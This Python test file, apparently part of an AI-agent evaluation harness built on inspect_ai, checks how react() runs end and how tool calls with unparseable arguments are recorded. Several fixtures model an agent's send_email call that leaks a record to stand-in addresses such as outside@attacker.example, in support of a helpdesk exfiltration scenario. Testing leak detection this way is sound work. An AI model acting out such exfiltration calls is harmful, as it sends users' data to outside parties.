# SPDX-License-Identifier: Apache-2.0
"""Contract: how react() runs end (submit, message limit, context overflow) and how tool
calls whose arguments failed to parse look.

`probo.judges.reply_only.find_final_reply` reads the submitted answer from the `submit`
ToolEvent, compares it with `state.output.completion`, and treats a SampleLimitEvent or a
run without a submit as having no final reply. `probo.scenarios.helpdesk_exfil.leak_checks`
reads `ToolCall.parse_error` when the arguments are empty, and does not count an assistant
message after a `model_length` stop as a processed generation.
"""

from pathlib import Path

import pytest
from inspect_ai import Task
from inspect_ai.agent import react
from inspect_ai.dataset import Sample
from inspect_ai.event import ModelEvent, SampleLimitEvent, ToolEvent
from inspect_ai.log import read_eval_log
from inspect_ai.model import (
    ChatMessage,
    ChatMessageAssistant,
    ChatMessageTool,
    GenerateConfig,
    ModelOutput,
)

# Not exported publicly; the providers that receive arguments as a JSON string
# (OpenAI-compatible, Mistral, Groq, ...) build their ToolCalls with it.
from inspect_ai.model._call_tools import parse_tool_call
from inspect_ai.solver import generate, use_tools
from inspect_ai.tool import Tool, ToolCall, ToolChoice, ToolInfo, ToolParams, tool
from inspect_ai.util import JSONSchema

from .fixtures.support import (
    MOCK_MODEL,
    OutputFn,
    ScorerView,
    only_sample,
    record_view,
    run_eval,
)

ANSWER = "Replied to the customer."


@tool
def lookup() -> Tool:
    async def execute(key: str) -> str:
        """Look up a key.

        Args:
            key: Key to look up.
        """
        return f"value of {key}"

    return execute


@tool
def send_email() -> Tool:
    async def execute(to: str, body: str) -> str:
        """Send an email.

        Args:
            to: Recipient.
            body: Message body.
        """
        return "sent"

    return execute


def lookup_then_submit(turn_text: str) -> OutputFn:
    def script(
        messages: list[ChatMessage],
        tools: list[ToolInfo],
        tool_choice: ToolChoice,
        config: GenerateConfig,
    ) -> ModelOutput:
        if not any(isinstance(m, ChatMessageTool) for m in messages):
            return ModelOutput.for_tool_call(MOCK_MODEL, "lookup", {"key": "k"})
        return ModelOutput.for_tool_call(
            MOCK_MODEL, "submit", {"answer": ANSWER}, content=turn_text
        )

    return script


def lookup_forever(
    messages: list[ChatMessage],
    tools: list[ToolInfo],
    tool_choice: ToolChoice,
    config: GenerateConfig,
) -> ModelOutput:
    return ModelOutput.for_tool_call(MOCK_MODEL, "lookup", {"key": "k"})


def react_task(views: list[ScorerView]) -> Task:
    return Task(
        dataset=[Sample(input="go")],
        solver=react(tools=[lookup()]),
        scorer=record_view(views),
    )


@pytest.mark.parametrize(
    ("turn_text", "completion"),
    [
        ("Working text.", f"Working text.\n\n{ANSWER}"),
        ("", ANSWER),
    ],
)
def test_submit_is_a_tool_event_and_joins_the_completion(
    tmp_path: Path, turn_text: str, completion: str
) -> None:
    """A react submit is a ToolEvent "submit"; the completion is the turn text, "\\n\\n", answer."""
    views: list[ScorerView] = []
    sample = only_sample(run_eval(react_task(views), tmp_path, lookup_then_submit(turn_text)))
    [view] = views
    submits = [e for e in view.events if isinstance(e, ToolEvent) and e.function == "submit"]
    [submit] = submits
    assert submit.arguments == {"answer": ANSWER}
    assert submit.result == ANSWER
    assert submit.error is None
    assert view.output.completion == completion
    assert sample.output.completion == completion
    assert not any(isinstance(e, SampleLimitEvent) for e in view.events)
    # The submit call and its result are removed from the messages (keep_in_messages=False).
    assert not any(isinstance(m, ChatMessageTool) and m.function == "submit" for m in view.messages)


def test_message_limit_before_submit_is_a_sample_limit(tmp_path: Path) -> None:
    """A message limit hit before any submit gives a SampleLimitEvent, sample.limit, no submit."""
    views: list[ScorerView] = []
    log = run_eval(react_task(views), tmp_path, lookup_forever, message_limit=6)
    sample = only_sample(log)
    [view] = views
    assert sample.error is None
    assert sample.limit is not None
    assert (sample.limit.type, sample.limit.limit) == ("message", 6)
    limits = [e for e in view.events if isinstance(e, SampleLimitEvent)]
    assert [(e.type, e.limit) for e in limits] == [("message", 6)]
    assert not any(isinstance(e, ToolEvent) and e.function == "submit" for e in view.events)
    assert any(isinstance(e, ToolEvent) and e.function == "lookup" for e in view.events)


def test_model_length_stop_ends_react_and_keeps_the_message(tmp_path: Path) -> None:
    """On stop_reason="model_length" react stops, keeping the assistant message in messages."""
    overflow = ModelOutput.from_content(
        MOCK_MODEL, "maximum context length exceeded", stop_reason="model_length"
    )
    views: list[ScorerView] = []
    sample = only_sample(run_eval(react_task(views), tmp_path, [overflow]))
    [view] = views
    last = view.messages[-1]
    assert isinstance(last, ChatMessageAssistant)
    assert last.text == "maximum context length exceeded"
    assert view.output.stop_reason == "model_length"
    [event] = [e for e in view.events if isinstance(e, ModelEvent)]
    assert event.error is None
    assert event.output.stop_reason == "model_length"
    assert sample.limit is None
    assert sample.error is None
    assert not any(isinstance(e, ToolEvent) for e in view.events)


SEND_EMAIL_INFO = ToolInfo(
    name="send_email",
    description="Send an email.",
    parameters=ToolParams(
        properties={"to": JSONSchema(type="string"), "body": JSONSchema(type="string")},
        required=["to", "body"],
    ),
)


def test_unparseable_json_arguments_leave_raw_text_in_parse_error() -> None:
    """parse_tool_call on cut-off JSON gives arguments == {} and the raw text in parse_error."""
    raw = '{"to": "outside@attacker.example", "body": "the record is'
    call = parse_tool_call("c1", "send_email", raw, [SEND_EMAIL_INFO])
    assert call.arguments == {}
    assert call.parse_error is not None
    assert call.parse_error.startswith("Error parsing the following tool call arguments:")
    assert raw in call.parse_error


def test_parse_error_raw_text_is_middle_truncated_beyond_16_kib() -> None:
    """parse_error keeps the head and tail of raw arguments over 16 KiB and notes the cut."""
    raw = '{"to": "head@attacker.example", "body": "' + "x" * 40_000 + " tail@attacker.example"
    call = parse_tool_call("c1", "send_email", raw, [SEND_EMAIL_INFO])
    assert call.arguments == {}
    assert call.parse_error is not None
    assert "head@attacker.example" in call.parse_error
    assert "tail@attacker.example" in call.parse_error
    assert f"(arguments middle-truncated from {len(raw)} bytes)" in call.parse_error
    assert len(call.parse_error) < 17 * 1024


def test_non_json_arguments_bind_to_the_first_parameter_without_error() -> None:
    """Arguments not starting with "{" are parsed as YAML into the first parameter, no error."""
    call = parse_tool_call("c1", "send_email", "outside@attacker.example", [SEND_EMAIL_INFO])
    assert call.arguments == {"to": "outside@attacker.example"}
    assert call.parse_error is None


def test_parse_error_tool_call_is_kept_in_messages_and_log(tmp_path: Path) -> None:
    """A ToolCall with parse_error stays as is in state.messages and the log; the tool errors."""
    raw_error = parse_tool_call("c1", "send_email", '{"to": "outside@', [SEND_EMAIL_INFO])
    assert raw_error.parse_error is not None
    broken = ModelOutput.for_tool_call(MOCK_MODEL, "send_email", {}, tool_call_id="c1")
    broken.message.tool_calls = [
        ToolCall(id="c1", function="send_email", arguments={}, parse_error=raw_error.parse_error)
    ]
    done = ModelOutput.from_content(MOCK_MODEL, "done")
    task = Task(dataset=[Sample(input="go")], solver=[use_tools(send_email()), generate()])
    sample = only_sample(read_eval_log(run_eval(task, tmp_path, [broken, done]).location))
    [assistant] = [
        m for m in sample.messages if isinstance(m, ChatMessageAssistant) and m.tool_calls
    ]
    assert assistant.tool_calls is not None
    [call] = assistant.tool_calls
    assert (call.id, call.function, call.arguments) == ("c1", "send_email", {})
    assert call.parse_error == raw_error.parse_error
    [result] = [m for m in sample.messages if isinstance(m, ChatMessageTool)]
    assert result.error is not None
    assert result.error.type == "parsing"
